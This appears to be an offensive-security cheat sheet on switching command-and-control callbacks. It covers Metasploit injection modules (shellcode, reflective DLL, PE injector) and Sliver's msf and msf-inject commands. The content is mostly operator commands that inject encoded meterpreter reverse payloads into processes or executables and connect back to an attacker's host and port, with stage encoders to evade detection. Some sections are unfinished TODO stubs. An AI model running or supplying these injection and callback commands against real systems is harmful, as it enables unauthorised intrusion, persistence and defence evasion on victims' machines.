# Switching Callbacks

Search Tag(s): #metasploit-framework

## 01 - Metasploit

TODO: Go through every MSF module

use post/windows/manage/exec_powershell

post/windows/manage/multi_meterpreter_inject

```
msf > use exploit/windows/local/payload_inject

options
```

run post/windows/manage/shellcode_inject

post/windows/manage/reflective_dll_inject

### Peinjector

```
meterpreter > load peinjector

Peinjector Commands
===================

    Command       Description
    -------       -----------
    injectpe      Inject a shellcode into a given executable
..[omitted]..
```

TODO: Fill this info

```
meterpreter > injectpe
```

```
msf post(windows/manage/peinjector) > set targetpe C:\\path\\to\\to\\program.exe

msf post(windows/manage/peinjector) > set session <session_ID>

msf post(windows/manage/peinjector) > set lhost <attacker_IP>

msf post(windows/manage/peinjector) > set lport <attacker_PORT>

msf post(windows/manage/peinjector) > run
```

## 02 - Sliver

### 2.1 - Help Menu

```
sliver (IMPLANT_NAME) > msf -h

Command: msf [--lhost] <options>
About: Execute a metasploit payload in the current process.

Usage:
======
  msf [flags]

Flags:
======
  -e, --encoder    string    msf encoder
  -h, --help                 display help
  -i, --iterations int       iterations of the encoder (default: 1)
  -L, --lhost      string    listen host
  -l, --lport      int       listen port (default: 4444)
  -m, --payload    string    msf payload (default: meterpreter_reverse_https)
  -t, --timeout    int       command timeout in seconds (default: 60)

sliver (IMPLANT_NAME) > msf-inject -h

Command: inject [--pid] [--lhost] <options>
About: Execute a metasploit payload in a remote process.

Usage:
======
  msf-inject [flags]

Flags:
======
  -e, --encoder    string    msf encoder
  -h, --help                 display help
  -i, --iterations int       iterations of the encoder (default: 1)
  -L, --lhost      string    listen host
  -l, --lport      int       listen port (default: 4444)
  -m, --payload    string    msf payload (default: meterpreter_reverse_https)
  -p, --pid        int       pid to inject into (default: -1)
  -t, --timeout    int       command timeout in seconds (default: 60)
```

### 2.2 - Usage

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload <payload>

msf exploit(multi/handler) > set EnableStageEncoding true

msf exploit(multi/handler) > set StageEncoder <x86/shikata_ga_nai | x64/xor_dynamic>

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run
```

- Inject meterpreter session directly in the same beacon process

```
sliver (IMPLANT_NAME) > msf [-e <x86/shikata_ga_nai | x64/xor_dynamic>] -i <iterations> -L <IP> -l <PORT> -m <payload>
```

- Inject meterpreter session through another process

```
sliver (IMPLANT_NAME) > msf-inject -p <pid> -e [x86/shikata_ga_nai | x64/xor_dynamic] -i <iterations> -L <IP> -l <PORT> -m <payload>
```

---
## References

- [Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

- [Hacker Cool: Shellcode Injection with Metasploit](https://www.hackercoolmagazine.com/metasploit-shellcode-injection-module/)

- [Hacking Articles: Metasploit for Pentester - Inject Payload into Executable](https://www.hackingarticles.in/metasploit-for-pentester-inject-payload-into-executable/)

- [Rapid7: Metasploit Framework - Build .NET Code](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/powershell/build_net_code.md)

- [CrowdStrike: Getting the bacon from Cobalt Strike Beacon](https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/)

- [Infosecmatter: RCE on Windows From Linux Part 1 Impacket](https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/)

- [CertCube Pass the Hash in Windows 10](https://blog.certcube.com/pass-the-hash-in-windows-10/)